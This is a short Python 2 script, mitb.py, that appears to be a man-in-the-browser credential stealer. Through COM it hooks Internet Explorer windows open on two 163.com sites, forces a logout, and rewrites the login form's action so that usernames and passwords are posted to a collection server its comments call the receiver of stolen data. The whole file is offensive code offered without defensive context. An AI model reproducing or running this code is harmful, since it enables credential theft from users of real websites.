#-*- coding:utf8 -*-  

"""
@version: 
@author: giantbranch
@file: mitb.py
@time: 2016/3/11 12:09
"""

import win32com.client
import time
import urlparse
import urllib

# 接受窃取的数据的服务器
data_receiver = "http://127.0.0.1:8080/"

# 目标站点
target_sites = {}

target_sites["www.163.com"] = {
    "logout_url"    : "",
    "logout_form"   : None,
    "logout_form_index":0,
    "owned"         :False
}
target_sites["reg.163.com"] = {
    "logout_url"    : "",
    "logout_form"   : None,
    "logout_form_index":0,
    "owned"         :False
}



# IE浏览器类的ID号
clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'

# COM对象实例化，就是上面那个
windows = win32com.client.Dispatch(clsid)

def wait_for_browser(browser):
    # 等待浏览器加载完一个页面
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)

    return

while True:

    for browser in windows:
        url = urlparse.urlparse(browser.LocationUrl)
        if url.hostname in target_sites:
            #print "i am in"
            if target_sites[url.hostname]["owned"]:
                continue

            # 如果有一个URL，我们可以重定向
            if target_sites[url.hostname]["logout_url"]:
                browser.Navigate(target_sites[url.hostname]["logout_url"])
                wait_for_browser(browser)
            else:
                # 检索文件中的所有元素
                full_doc = browser.Document.all
                # 迭代寻找注销表单
                for i in full_doc:
                    try:
                        # 找到退出登陆的表单并提交
                        if i.id == target_sites[url.hostname]["logout_form"]:
                            i.submit()
                            wait_for_browser(browser)
                    except:
                        pass
            # 现在来修改登陆表单
            try:
                login_index = target_sites[url.hostname]["login_form_index"]
                login_page = urllib.quote(browser.LocationUrl)
                browser.Document.forms[login_index].action = "%s%s" % (data_receiver, login_page)
                target_sites[url.hostname]["owned"] = True
            except:
                pass
        time.sleep(5)



